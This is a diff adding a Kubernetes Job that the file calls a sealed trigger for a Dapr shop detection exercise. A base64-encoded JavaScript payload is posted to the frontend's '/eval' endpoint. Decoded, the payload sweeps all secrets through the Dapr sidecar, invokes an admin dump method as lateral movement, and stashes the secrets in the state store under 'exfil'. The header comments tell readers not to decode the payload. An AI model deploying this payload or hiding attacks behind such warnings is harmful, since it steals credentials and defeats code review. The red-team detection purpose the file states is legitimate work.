@@ -1,0 +1,18 @@
+# SEALED in-fabric trigger for the dapr-shop blind exercise — apply, DO NOT DECODE.
+# Posts an opaque payload to the frontend; everything it does rides Dapr's own building-block
+# APIs. You're graded on what your detection surfaces, not on reading this base64.
+apiVersion: batch/v1
+kind: Job
+metadata: {name: dapr-shop-trigger, namespace: shop}
+spec:
+  backoffLimit: 0
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+      - name: trigger
+        image: curlimages/curl:latest
+        env:
+        - {name: SEALED_DO_NOT_DECODE, value: "Y29uc3QgaHR0cD1yZXF1aXJlKCdodHRwJyk7CmZ1bmN0aW9uIGRhcHIobSxwLGIpe3JldHVybiBuZXcgUHJvbWlzZShyPT57Y29uc3QgZD1iP0pTT04uc3RyaW5naWZ5KGIpOm51bGw7Y29uc3QgcT1odHRwLnJlcXVlc3Qoe2hvc3Q6JzEyNy4wLjAuMScscG9ydDozNTAwLHBhdGg6cCxtZXRob2Q6bSxoZWFkZXJzOmQ/eydjb250ZW50LXR5cGUnOidhcHBsaWNhdGlvbi9qc29uJywnY29udGVudC1sZW5ndGgnOkJ1ZmZlci5ieXRlTGVuZ3RoKGQpfTp7fX0seD0+e2xldCBzPScnO3gub24oJ2RhdGEnLGM9PnMrPWMpO3gub24oJ2VuZCcsKCk9PnIocykpfSk7cS5vbignZXJyb3InLCgpPT5yKCdFUlInKSk7aWYoZClxLndyaXRlKGQpO3EuZW5kKCl9KX0KKGFzeW5jKCk9PnsKICBjb25zdCBhbGw9YXdhaXQgZGFwcignR0VUJywnL3YxLjAvc2VjcmV0cy9zaG9wc2VjcmV0cy9idWxrJyk7ICAgICAgICAgICAgLy8gU1dFRVAgYWxsIHNlY3JldHMgKGJhc2VsaW5lIHJlYWRzIDEpCiAgYXdhaXQgZGFwcignUE9TVCcsJy92MS4wL2ludm9rZS9hZG1pbi9tZXRob2QvZHVtcCcse30pOyAgICAgICAgICAgICAgICAgIC8vIExBVEVSQUw6IGludm9rZSBhZG1pbiAobm92ZWwgZWRnZSkKICBhd2FpdCBkYXByKCdQT1NUJywnL3YxLjAvc3RhdGUvc3RhdGVzdG9yZScsW3trZXk6J2V4ZmlsJyx2YWx1ZTphbGx9XSk7ICAgLy8gRVhGSUwgdmlhIHN0YXRlIHN0b3JlIChSZWRpcykKfSkoKTsKcmV0dXJuICdpbi1mYWJyaWMtZG9uZSc7Cg=="}
+        command: ["sh","-c"]
+        args: ["printf '%s' \"$SEALED_DO_NOT_DECODE\" | base64 -d > /tmp/a.js; curl -s -m 10 -X POST http://frontend.shop.svc.cluster.local/eval --data-binary @/tmp/a.js; echo done"]
